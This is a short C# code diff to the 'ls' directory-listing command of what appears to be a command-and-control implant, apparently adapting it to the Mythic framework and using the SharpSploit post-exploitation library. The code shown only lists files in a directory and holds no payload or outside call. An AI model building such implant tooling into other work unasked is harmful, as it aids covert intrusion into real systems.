@@ -10,19 +10,19 @@ namespace Cerberus.Commands
     {
         public override string Name => "ls";
 
-        public override string Execute(CerberusTask task)
+        public override string Execute(MythicTask task)
         {
             var results = new SharpSploitResultList<ListDirectoryResult>();
-
+            var Arguments = task.parameters.Split(' ');
             string path;
 
-            if (task.Arguments is null || task.Arguments.Length == 0)
+            if (Arguments is null || Arguments.Length == 0)
             {
                 path = Directory.GetCurrentDirectory();
             }
             else
             {
-                path = task.Arguments[0];
+                path = Arguments[0];
             }
 
             var files = Directory.GetFiles(path);
